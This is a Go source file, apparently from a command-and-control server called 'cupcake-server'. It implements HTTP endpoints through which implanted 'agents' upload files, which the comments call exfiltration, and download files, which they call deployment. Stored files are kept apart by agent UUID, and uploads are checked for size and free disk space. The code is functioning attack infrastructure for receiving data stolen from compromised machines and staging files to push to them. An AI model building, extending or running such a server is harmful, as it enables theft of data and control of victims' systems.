package services

import (
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"

	"cupcake-server/pkg/paths"
)

// MaxAgentUploadBytes is the per-file ceiling for agent exfiltration uploads.
const MaxAgentUploadBytes int64 = 256 << 20 // 256 MiB

var agentUUIDRe = regexp.MustCompile(`(?i)^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`)

func transferRoot() string {
	return paths.Join("agent_files")
}

func InitTransfer() {
	os.MkdirAll(transferRoot(), 0755)
}

// ValidAgentUUID reports whether s is an RFC-4122 UUID string (agent IDs).
func ValidAgentUUID(s string) bool {
	s = strings.TrimSpace(s)
	if s == "" {
		return false
	}
	if !agentUUIDRe.MatchString(s) {
		return false
	}
	_, err := uuid.Parse(s)
	return err == nil
}

// ValidateAgentUpload applies UUID + size gates used by HandleAgentUpload.
// Returns HTTP status and error message; status 0 means OK.
func ValidateAgentUpload(uuidStr string, size int64) (status int, msg string) {
	if size < 0 {
		size = 0
	}
	if size > MaxAgentUploadBytes {
		return http.StatusRequestEntityTooLarge, "file too large"
	}
	uuidStr = strings.TrimSpace(uuidStr)
	if uuidStr == "" {
		return http.StatusBadRequest, "Agent UUID is required"
	}
	if !ValidAgentUUID(uuidStr) {
		return http.StatusBadRequest, "invalid agent UUID"
	}
	return 0, ""
}

// ValidateAgentUploadWithDisk extends ValidateAgentUpload with a free-space gate.
// freeBytes is the caller's measured free space (for tests inject a fake value;
// production uses FreeDiskBytes / CheckDiskForWrite).
// Returns HTTP status and error message; status 0 means OK.
func ValidateAgentUploadWithDisk(uuidStr string, size int64, freeBytes int64) (status int, msg string) {
	if status, msg := ValidateAgentUpload(uuidStr, size); status != 0 {
		return status, msg
	}
	if size < 0 {
		size = 0
	}
	if err := RejectIfInsufficient(freeBytes, size, MinFreeDiskBytes()); err != nil {
		return http.StatusInsufficientStorage, "insufficient disk space"
	}
	return 0, ""
}

// Handler: Agent Uploads File (Exfiltration)
// POST /api/transfer/upload
func HandleAgentUpload(c *gin.Context) {
	// 1. Get the file from Multipart form
	file, err := c.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "No file found"})
		return
	}

	uuidStr := strings.TrimSpace(c.PostForm("uuid"))
	if status, msg := ValidateAgentUpload(uuidStr, file.Size); status != 0 {
		body := gin.H{"error": msg}
		if status == http.StatusRequestEntityTooLarge {
			body["max_bytes"] = MaxAgentUploadBytes
		}
		c.JSON(status, body)
		return
	}

	// Disk/quota gate before any write (size already capped by MaxAgentUploadBytes).
	if err := CheckDiskForWrite(transferRoot(), file.Size); err != nil {
		c.JSON(http.StatusInsufficientStorage, gin.H{
			"error":         "insufficient disk space",
			"min_free_bytes": MinFreeDiskBytes(),
		})
		return
	}

	// 2. Save file directly to disk (Isolated by UUID)
	filename := filepath.Base(file.Filename)
	if filename == "." || filename == ".." || filename == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid filename"})
		return
	}
	agentDir := filepath.Join(transferRoot(), uuidStr)
	os.MkdirAll(agentDir, 0755)

	savePath := filepath.Join(agentDir, filename)

	if err := c.SaveUploadedFile(file, savePath); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to save file"})
		return
	}

	// Post-save size re-check (Content-Length may have been wrong)
	if fi, err := os.Stat(savePath); err == nil && fi.Size() > MaxAgentUploadBytes {
		_ = os.Remove(savePath)
		c.JSON(http.StatusRequestEntityTooLarge, gin.H{
			"error":     "file too large",
			"max_bytes": MaxAgentUploadBytes,
		})
		return
	}

	fmt.Printf("[+] File Received from Agent %s: %s\n", uuidStr, savePath)
	c.JSON(http.StatusOK, gin.H{"status": "success", "path": savePath})
}

// Handler: Agent Downloads File (Deployment)
// GET /api/transfer/download/:filename
func HandleAgentDownload(c *gin.Context) {
	filename := filepath.Base(c.Param("filename"))
	uuidStr := c.Query("uuid") // Expect UUID for isolation

	if filename == "." || filename == ".." || filename == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid filename"})
		return
	}

	targetPath := ""
	if uuidStr != "" {
		if !ValidAgentUUID(uuidStr) {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid agent UUID"})
			return
		}
		targetPath = filepath.Join(transferRoot(), uuidStr, filename)
	} else {
		targetPath = filepath.Join(transferRoot(), filename)
	}

	// Check if file exists
	if _, err := os.Stat(targetPath); os.IsNotExist(err) {
		c.JSON(http.StatusNotFound, gin.H{"error": "File not found"})
		return
	}

	// Serve file (Gin handles streaming efficiently)
	c.File(targetPath)
}
